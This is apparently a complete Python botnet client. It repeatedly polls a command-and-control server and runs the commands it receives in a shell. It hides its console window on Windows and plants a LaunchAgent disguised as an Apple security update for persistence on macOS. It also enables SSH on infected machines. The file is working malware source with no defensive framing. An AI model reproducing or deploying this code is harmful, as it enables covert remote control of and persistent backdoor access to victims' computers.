import requests
import time
import subprocess
import multiprocessing
import os
import platform

# C2 Server URL
C2_URL = "http://127.0.0.1:5001"


# Function for each bot
def bot_instance(bot_id):
    while True:
        try:
            # Register bot with C2 server
            requests.post(f"{C2_URL}/register")

            # Fetch command from C2 server
            command = requests.get(f"{C2_URL}/command/{bot_id}").text

            # Execute the command if it's not empty
            if command and command.lower() != "no command":
                result = subprocess.run(command, shell=True, capture_output=True)
                print(f"[Bot {bot_id}] Executed Command: {command}")
                print(f"[Bot {bot_id}] Output: {result.stdout.decode().strip()}")

            # Sleep before checking for commands again
            time.sleep(5)

        except Exception as e:
            print(f"[Bot {bot_id}] Error: {str(e)}")
            time.sleep(5)


# Hide bot execution (Windows & macOS)
def hide_execution():
    """ Runs bot in the background without showing a console window. """

    if os.name == "nt":  # Windows
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "python", __file__],
                         startupinfo=startupinfo)

    elif platform.system() == "Darwin":  # macOS
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.securityupdate.plist")
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.apple.securityupdate</string>
            <key>ProgramArguments</key>
            <array>
                <string>/usr/bin/python3</string>
                <string>{os.path.abspath(__file__)}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>KeepAlive</key>
            <true/>
        </dict>
        </plist>
        """

        with open(plist_path, "w") as f:
            f.write(plist_content)

        os.system(f"launchctl load {plist_path}")

        print("[*] Persistence added for macOS.")


# Function to enable SSH access
def enable_ssh():
    if platform.system() == "Linux" or platform.system() == "Darwin":  # Linux & macOS
        os.system("sudo systemctl start ssh")
        os.system("sudo systemctl enable ssh")
        print("[*] SSH Access Enabled")

    elif platform.system() == "Windows":  # Windows
        os.system("powershell -Command \"Start-Service sshd\"")
        os.system("powershell -Command \"Set-Service -Name sshd -StartupType Automatic\"")
        print("[*] SSH Access Enabled")


if __name__ == "__main__":
    # Enable SSH on startup
    enable_ssh()

    # Hide execution first
    hide_execution()

    # Start bot process
    bot_instance(1)  # Runs only one bot per infected machine
